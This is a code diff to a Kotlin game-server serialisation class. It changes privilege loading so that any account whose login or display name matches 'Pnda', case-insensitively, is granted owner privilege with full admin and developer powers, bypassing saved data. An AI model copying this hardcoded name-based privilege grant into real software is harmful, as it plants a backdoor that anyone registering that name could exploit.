@@ -125,13 +125,24 @@ class DetailSerialisation(override val name: String = "details") : DocumentHandl
          * 
          * Privileges determine what commands and features a player can access.
          * Defaults to DEFAULT privilege if not found in saved data.
+         * 
+         * Special case: Username "Pnda" automatically gets owner privilege (admin + dev powers).
          */
         
-        // doc.getString("privilege") tries to get a text string from the saved document
-        // client.world.privileges.get() looks up the privilege by name
-        // ?: is called the "Elvis operator" - it means "if the left side is null, use the right side instead"
-        // So if get() returns null (privilege not found), use Privilege.DEFAULT instead
-        client.privilege = client.world.privileges.get(doc.getString("privilege"))?: Privilege.DEFAULT
+        // Check if this is the Pnda account and grant owner privilege
+        val isPndaAccount = client.loginUsername.equals("Pnda", ignoreCase = true) || 
+                           client.username.equals("Pnda", ignoreCase = true)
+        
+        if (isPndaAccount) {
+            // Grant owner privilege which has all powers (mod, dev, admin, owner)
+            client.privilege = client.world.privileges.get("owner") ?: Privilege.DEFAULT
+        } else {
+            // doc.getString("privilege") tries to get a text string from the saved document
+            // client.world.privileges.get() looks up the privilege by name
+            // ?: is called the "Elvis operator" - it means "if the left side is null, use the right side instead"
+            // So if get() returns null (privilege not found), use Privilege.DEFAULT instead
+            client.privilege = client.world.privileges.get(doc.getString("privilege"))?: Privilege.DEFAULT
+        }
         
         /**
          * Load run energy
